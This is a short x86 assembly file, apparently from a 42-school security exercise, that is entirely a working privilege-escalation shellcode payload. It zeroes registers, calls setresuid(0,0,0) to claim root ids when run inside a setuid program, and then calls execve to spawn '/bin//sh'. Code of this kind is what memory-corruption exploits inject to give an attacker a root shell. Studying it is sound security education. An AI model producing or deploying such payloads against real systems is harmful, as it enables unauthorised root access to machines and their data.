BITS 32
; Made by skuppers: skuppers@student.42.fr

section .text

global main

main:
; setresuid(uid_t ruid, uid_t euid, uid_t suid)
	xor eax, eax	; Zero out eax, ebx, ecx, edx
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
	mov al, 0xa4	; Syscall 0xa4 or 164
	int 0x80
; execve(const char *filename, char *const argv[], cahr *const envp[])
	xor eax, eax	    ; Zero out again
	push eax            ; Push 0x0 on stack for string termination
	push 0x68732f2f     ; Push '//sh'
	push 0x6e69622f     ; Push '/bin'
	mov ebx,esp         ; Push '/bin//sh' from stack to ebx
	push eax	    ; Terminate av[]
	mov ecx,esp         ; Put '/bin//sh' in av[0]
	mov edx,eax         ; Zero out edx: envp
	mov al, 0xb         ; Syscall 11
	int 0x80            ; Interrupt	

	
